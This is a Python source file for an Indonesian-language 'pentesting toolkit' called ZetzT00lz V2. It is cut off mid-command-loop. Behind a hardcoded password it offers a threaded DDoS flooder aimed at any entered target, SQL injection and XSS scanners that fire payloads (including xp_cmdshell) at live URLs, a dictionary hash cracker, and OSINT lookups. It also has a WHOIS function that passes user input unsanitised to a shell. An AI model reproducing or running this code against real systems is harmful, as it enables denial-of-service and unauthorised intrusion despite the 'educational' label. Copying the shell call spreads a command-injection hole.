#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZetzT00lz V2 - Advanced Pentesting Toolkit
Created by: DeemZet
Version: 2.0
"""

import os
import sys
import socket
import requests
import json
import threading
import time
import random
import subprocess
import re
import hashlib
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Password untuk akses
ACCESS_PASSWORD = "DimzGanteng"

# ASCII Art dengan warna
ASCII_ART = f"""
{Fore.CYAN} _____    _         _____           _      __     ______  
{Fore.CYAN}|__  /___| |_ ____ |_   _|__   ___ | |____ \\ \\   / /___ \\ 
{Fore.CYAN}  / // _ \\ __|_  /   | |/ _ \\ / _ \\| |_  /  \\ \\ / /  __) |
{Fore.CYAN} / /|  __/ |_ / /    | | (_) | (_) | |/ /    \\ V /  / __/ 
{Fore.CYAN}/____\\___|\\__/___|   |_|\\___/ \\___/|_/___|    \\_/  |_____|
{Fore.YELLOW}                                                      v2.0
"""

class ZetzT00lzV2:
    def __init__(self):
        self.running = True
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        self.get_system_info()
        
    def get_system_info(self):
        """Mendapatkan informasi sistem user"""
        try:
            # IP Public
            try:
                self.public_ip = requests.get('https://api.ipify.org').text
            except:
                self.public_ip = "Tidak terdeteksi"
            
            # OS Info
            self.os_name = os.name
            if os.name == 'posix':
                self.os_detail = subprocess.getoutput('uname -a')
            else:
                self.os_detail = sys.platform
            
            # Device/Username
            self.username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'Unknown')
            
        except Exception as e:
            self.public_ip = "Error"
            self.os_detail = "Unknown"
            self.username = "Unknown"
    
    def clear_screen(self):
        """Membersihkan layar"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Menampilkan banner"""
        self.clear_screen()
        print(ASCII_ART)
        print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║               SYSTEM INFORMATION                         ║")
        print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║ Public IP    : {self.public_ip:<43} ║")
        print(f"{Fore.CYAN}║ OS           : {self.os_detail[:45]:<45} ║")
        print(f"{Fore.CYAN}║ User         : {self.username:<43} ║")
        print(f"{Fore.CYAN}║ Time         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<43} ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
        print()
    
    def login(self):
        """Login dengan password"""
        self.print_banner()
        print(f"{Fore.YELLOW}[!] Masukkan password untuk mengakses ZetzT00lz V2")
        
        attempts = 3
        while attempts > 0:
            password = input(f"{Fore.WHITE}[?] Password: {Fore.RESET}")
            if password == ACCESS_PASSWORD:
                print(f"{Fore.GREEN}[✓] Akses diberikan! Memuat tools...")
                time.sleep(1)
                return True
            else:
                attempts -= 1
                print(f"{Fore.RED}[✗] Password salah! Sisa percobaan: {attempts}")
        
        print(f"{Fore.RED}[!] Akses ditolak! Program dihentikan.")
        return False
    
    def osint_ip_tracker(self, ip_address):
        """Melacak informasi IP"""
        print(f"\n{Fore.CYAN}[*] Melacak IP: {ip_address}")
        
        try:
            # Menggunakan ipapi.co
            response = requests.get(f'https://ipapi.co/{ip_address}/json/')
            data = response.json()
            
            if 'error' not in data:
                print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║                    IP TRACKER RESULTS                    ║")
                print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
                print(f"{Fore.CYAN}║ IP Address    : {data.get('ip', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ City          : {data.get('city', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ Region        : {data.get('region', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ Country       : {data.get('country_name', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ ISP           : {data.get('org', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ Latitude      : {data.get('latitude', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ Longitude     : {data.get('longitude', 'N/A'):<43} ║")
                print(f"{Fore.CYAN}║ Timezone      : {data.get('timezone', 'N/A'):<43} ║")
                print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
                
                # Google Maps link
                if 'latitude' in data and 'longitude' in data:
                    print(f"{Fore.YELLOW}[+] Google Maps: https://maps.google.com/?q={data['latitude']},{data['longitude']}")
            else:
                print(f"{Fore.RED}[✗] IP tidak valid atau tidak ditemukan")
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {e}")
    
    def osint_email_tracker(self, email):
        """Melacak informasi email"""
        print(f"\n{Fore.CYAN}[*] Melacak Email: {email}")
        
        # Cek format email
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            print(f"{Fore.RED}[✗] Format email tidak valid")
            return
        
        print(f"{Fore.YELLOW}[!] Memeriksa kebocoran data...")
        time.sleep(1)
        
        # Simulasi pemeriksaan (dalam real implementation bisa integrate dengan API)
        print(f"{Fore.GREEN}[+] Email valid: {email}")
        print(f"{Fore.YELLOW}[!] Tips: Gunakan haveibeenpwned.com untuk cek kebocoran data")
        
        # Ekstrak domain email
        domain = email.split('@')[1]
        print(f"{Fore.CYAN}[*] Domain email: {domain}")
        print(f"{Fore.YELLOW}[!] Lakukan WHOIS lookup untuk domain tersebut")
    
    def osint_phone_tracker(self, phone):
        """Melacak informasi nomor telepon"""
        print(f"\n{Fore.CYAN}[*] Melacak Nomor: {phone}")
        
        # Hapus karakter non-digit
        clean_phone = re.sub(r'\D', '', phone)
        
        if len(clean_phone) < 8:
            print(f"{Fore.RED}[✗] Nomor telepon terlalu pendek")
            return
        
        print(f"{Fore.YELLOW}[!] Menganalisis format nomor...")
        time.sleep(1)
        
        # Deteksi kode negara (sederhana)
        if clean_phone.startswith('62'):
            country = "Indonesia"
            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: Indonesia (+62)")
        elif clean_phone.startswith('1'):
            country = "USA/Canada"
            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: USA/Canada (+1)")
        elif clean_phone.startswith('44'):
            country = "UK"
            print(f"{Fore.GREEN}[+] Kode negara terdeteksi: UK (+44)")
        else:
            country = "Unknown"
            print(f"{Fore.YELLOW}[!] Kode negara tidak dikenali")
        
        print(f"{Fore.YELLOW}[!] Catatan: Pelacakan lengkap membutuhkan API berbayar")
    
    def ddos_attack(self, target, port=80, threads=100, duration=30):
        """Melakukan DDoS attack (EDUCATIONAL PURPOSE ONLY)"""
        print(f"\n{Fore.RED}[!] PERINGATAN: DDoS ILLEGAL tanpa izin!")
        print(f"{Fore.YELLOW}[!] Ini hanya untuk edukasi dan testing sistem sendiri")
        
        confirm = input(f"{Fore.WHITE}[?] Lanjutkan? (y/n): {Fore.RESET}").lower()
        if confirm != 'y':
            return
        
        print(f"\n{Fore.CYAN}[*] Memulai DDoS attack ke {target}:{port}")
        print(f"{Fore.CYAN}[*] Threads: {threads}, Durasi: {duration} detik")
        
        attack_count = 0
        stop_attack = False
        
        def attack_thread():
            nonlocal attack_count
            while not stop_attack:
                try:
                    # Membuat socket connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port))
                    
                    # Mengirim packet
                    sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
                    sock.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
                    sock.close()
                    
                    attack_count += 1
                    
                except Exception as e:
                    continue
        
        # Start threads
        thread_list = []
        start_time = time.time()
        
        for i in range(threads):
            thread = threading.Thread(target=attack_thread)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        print(f"{Fore.YELLOW}[!] Attack berjalan... Tekan Ctrl+C untuk berhenti")
        
        try:
            while time.time() - start_time < duration:
                time.sleep(1)
                print(f"{Fore.CYAN}[*] Packets terkirim: {attack_count}", end='\r')
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack dihentikan oleh user")
        
        stop_attack = True
        time.sleep(1)
        
        print(f"\n{Fore.GREEN}[+] Attack selesai!")
        print(f"{Fore.GREEN}[+] Total packets terkirim: {attack_count}")
    
    def sql_injection_scanner(self, url):
        """Scanner SQL Injection sederhana"""
        print(f"\n{Fore.CYAN}[*] Scanning SQL Injection: {url}")
        
        # Daftar payload SQL Injection
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--",
            "' EXEC xp_cmdshell('dir')--"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            test_url = f"{url}{payload}"
            print(f"{Fore.YELLOW}[!] Testing: {payload[:20]}...")
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = requests.get(test_url, headers=headers, timeout=5)
                
                # Deteksi error SQL
                sql_errors = [
                    'sql syntax',
                    'mysql_fetch',
                    'mysql_num_rows',
                    'you have an error in your sql',
                    'warning: mysql',
                    'unclosed quotation mark',
                    'sql server',
                    'odbc driver',
                    'postgresql'
                ]
                
                for error in sql_errors:
                    if error in response.text.lower():
                        print(f"{Fore.GREEN}[+] VULNERABLE! Payload: {payload}")
                        print(f"{Fore.GREEN}[+] Error ditemukan: {error}")
                        vulnerable = True
                        break
                        
            except Exception as e:
                continue
        
        if not vulnerable:
            print(f"{Fore.RED}[-] Tidak ditemukan kerentanan SQL Injection")
        else:
            print(f"{Fore.GREEN}[+] Situs mungkin rentan SQL Injection!")
    
    def password_cracker(self, hash_value, hash_type='md5', wordlist=None):
        """Password cracker sederhana"""
        print(f"\n{Fore.CYAN}[*] Cracking hash: {hash_value}")
        print(f"{Fore.CYAN}[*] Hash type: {hash_type}")
        
        # Wordlist default
        if not wordlist:
            wordlist = [
                'password', '123456', 'admin', 'qwerty', 'password123',
                'admin123', 'letmein', 'welcome', 'monkey', '123456789'
            ]
        
        found = False
        
        for word in wordlist:
            # Hash kata sesuai tipe
            if hash_type.lower() == 'md5':
                hashed = hashlib.md5(word.encode()).hexdigest()
            elif hash_type.lower() == 'sha1':
                hashed = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type.lower() == 'sha256':
                hashed = hashlib.sha256(word.encode()).hexdigest()
            else:
                print(f"{Fore.RED}[✗] Hash type tidak didukung")
                return
            
            print(f"{Fore.YELLOW}[!] Testing: {word}", end='\r')
            
            if hashed == hash_value.lower():
                print(f"\n{Fore.GREEN}[+] PASSWORD DITEMUKAN: {word}")
                found = True
                break
        
        if not found:
            print(f"\n{Fore.RED}[-] Password tidak ditemukan dalam wordlist")
    
    def xss_scanner(self, url):
        """Scanner XSS sederhana"""
        print(f"\n{Fore.CYAN}[*] Scanning XSS: {url}")
        
        # Payload XSS
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '\"><script>alert(1)</script>',
            'javascript:alert("XSS")'
        ]
        
        vulnerable = False
        
        for payload in payloads:
            test_url = f"{url}{urllib.parse.quote(payload)}"
            print(f"{Fore.YELLOW}[!] Testing payload...")
            
            try:
                response = requests.get(test_url, timeout=5)
                
                if payload.replace('<', '&lt;') not in response.text:
                    if payload in response.text or payload.replace('<', '&lt;') in response.text:
                        print(f"{Fore.GREEN}[+] Mungkin VULNERABLE ke XSS!")
                        print(f"{Fore.GREEN}[+] Payload: {payload[:30]}...")
                        vulnerable = True
                        
            except Exception as e:
                continue
        
        if not vulnerable:
            print(f"{Fore.RED}[-] Tidak ditemukan kerentanan XSS")
    
    def whois_lookup(self, domain):
        """WHOIS lookup untuk domain"""
        print(f"\n{Fore.CYAN}[*] WHOIS Lookup: {domain}")
        
        try:
            # Menggunakan whois command jika tersedia
            if os.name == 'posix':
                result = subprocess.getoutput(f'whois {domain}')
                print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║                    WHOIS RESULTS                         ║")
                print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════╣")
                
                lines = result.split('\n')
                important_lines = [
                    'Domain Name:', 'Registrar:', 'Creation Date:', 
                    'Expiration Date:', 'Name Server:', 'Registrant:',
                    'Admin:', 'Tech:', 'Status:'
                ]
                
                for line in lines[:30]:  # Tampilkan 30 baris pertama
                    for important in important_lines:
                        if important.lower() in line.lower():
                            print(f"{Fore.CYAN}║ {line[:60]:<60} ║")
                            break
                
                print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════╝")
            else:
                # Fallback ke API online
                print(f"{Fore.YELLOW}[!] Gunakan whois di Linux atau kunjungi:")
                print(f"{Fore.YELLOW}[!] https://who.is/whois/{domain}")
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {e}")
            print(f"{Fore.YELLOW}[!] Kunjungi: https://who.is/whois/{domain}")
    
    def show_help(self):
        """Menampilkan menu help"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                     ZetzT00lz V2 - HELP MENU                        ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.YELLOW}║ Command                 Description                               ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.GREEN}║ ip <address>            OSINT IP Tracker                          ║")
        print(f"{Fore.GREEN}║ email <address>         OSINT Email Tracker                       ║")
        print(f"{Fore.GREEN}║ phone <number>          OSINT Phone Tracker                       ║")
        print(f"{Fore.GREEN}║ ddos <target> [port]    DDoS Attack (EDUCATIONAL)                 ║")
        print(f"{Fore.GREEN}║ sql <url>               SQL Injection Scanner                     ║")
        print(f"{Fore.GREEN}║ crack <hash> [type]     Password Cracker (md5/sha1/sha256)        ║")
        print(f"{Fore.GREEN}║ xss <url>               XSS Scanner                               ║")
        print(f"{Fore.GREEN}║ whois <domain>          WHOIS Domain Lookup                       ║")
        print(f"{Fore.GREEN}║ sysinfo                 Show System Information                   ║")
        print(f"{Fore.GREEN}║ clear                   Clear Screen                              ║")
        print(f"{Fore.GREEN}║ help                    Show This Menu                            ║")
        print(f"{Fore.GREEN}║ exit                    Exit Program                              ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════╝")
        print()
    
    def run(self):
        """Menjalankan main program"""
        if not self.login():
            return
        
        while self.running:
            try:
                self.print_banner()
                cmd = input(f"\n{Fore.RED}ZetzT00lz{Fore.WHITE}@{Fore.CYAN}{self.username}{Fore.WHITE}:~# {Fore.RESET}").strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == "exit":
                    print(f"\n{Fore.YELLOW}[!] Keluar dari ZetzT00lz V2...")
                    self.running = False
                
                elif command == "help":
                    self.show_help()
                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
                
                elif command == "clear":
                    continue
                
                elif command == "sysinfo":
                    self.print_banner()
                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
                
                elif command == "ip" and len(parts) > 1:
                    self.osint_ip_tracker(parts[1])
                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
                
                elif command == "email" and len(parts) > 1:
                    self.osint_email_tracker(parts[1])
                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
                
                elif command == "phone" and len(parts) > 1:
                    self.osint_phone_tracker(parts[1])
                    input(f"\n{Fore.YELLOW}[Press Enter to continue]")
                
                elif command == "ddos" and len(parts) > 1:
          
